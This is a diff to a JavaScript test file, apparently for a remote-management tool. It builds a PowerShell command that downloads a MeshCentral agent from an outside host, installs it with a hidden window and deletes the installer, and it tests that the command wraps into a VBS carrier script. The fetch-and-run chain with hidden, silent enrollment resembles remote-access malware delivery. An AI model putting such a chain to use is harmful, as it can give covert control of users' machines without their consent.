@@ -449,7 +449,12 @@ const MESH_INSTALL_PS = [
   `$ProgressPreference = 'SilentlyContinue'`,
   `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
   `$exe = Join-Path $env:TEMP 'meshagent64.exe'`,
-  `Invoke-WebRequest -Uri "https://mesh.instaweb.top/meshagents?id=4&meshid=0123ABCDEF" -OutFile $exe -UseBasicParsing`,
+  // TASK_232b — the EXACT shape Vantra's buildMeshAgentInstallCommand emits:
+  // single-line for/try/catch retry, single-quoted URI (raw meshid may contain
+  // $ and @), no double quotes anywhere, no line-leading closing brace. The old
+  // multi-line draft with a double-quoted throw threw interpolating_double_quote
+  // in the normalizer and 502'd every mesh Download .vbs / link resolution.
+  `for ($i = 1; $i -le 3; $i++) { try { Invoke-WebRequest -Uri 'https://mesh.instaweb.top/meshagents?id=4&meshid=41@ZqzqAB$Cd' -OutFile $exe -UseBasicParsing; break } catch { if ($i -ge 3) { throw ('Mesh agent download failed after 3 attempts: ' + $_.Exception.Message) }; Start-Sleep -Seconds 2 } }`,
   `Start-Process -FilePath $exe -ArgumentList '-install' -WindowStyle Hidden -Wait`,
   `Remove-Item $exe -Force -ErrorAction SilentlyContinue`,
   `'MeshCentral agent installed.'`,
@@ -468,5 +473,27 @@ test("TASK_231: flattened mesh command (carrier normalise output) also passes", 
 
 test("TASK_231: non-mesh commands still fail closed on missing -m install (regression pin)", () => {
   assert.throws(() => ensureSilentEnroll("Invoke-WebRequest -Uri 'https://x'"), /enroll_not_found/);
+});
+
+test("TASK_232b: the mesh command normalizes + renders through the VBS carrier end-to-end", () => {
+  // Incident 2026-10-19 (the retry regression): the first multi-line retry
+  // draft with a double-quoted throw threw interpolating_double_quote in
+  // normalizePowerShellCommand, so Download .vbs surfaced that raw code in the
+  // UI and /link/vantra/<token> (D5 regeneration) answered
+  // link_resolution_failed 502 for every mesh org.
+  const flat = normalizePowerShellCommand(MESH_INSTALL_PS);
+  assert.ok(flat.includes("for ($i = 1; $i -le 3; $i++)"), "3 attempts survive flatten");
+  assert.ok(flat.includes("Start-Sleep -Seconds 2"), "2s spacing survives flatten");
+  assert.ok(flat.includes("Mesh agent download failed after 3 attempts"), "loud final error survives");
+  assert.ok(!flat.includes('"'), "no double quotes reach the VBS string context");
+  assert.equal(ensureSilentEnroll(flat), flat, "mesh passthrough must stay byte-identical");
+  const vbs = renderCarrierVbs(ensureSilentEnroll(flat));
+  const chunks = [...vbs.matchAll(/ps = ps & "((?:[^"]|"")*)"/g)].map((m) =>
+    m[1].replace(/""/g, '"'),
+  );
+  assert.equal(chunks.join(""), flat, "VBS chunks must rejoin to the flat command");
+  for (const line of vbs.split("\n")) {
+    assert.ok(line.length <= 1023, `line over budget (${line.length})`);
+  }
 });
 
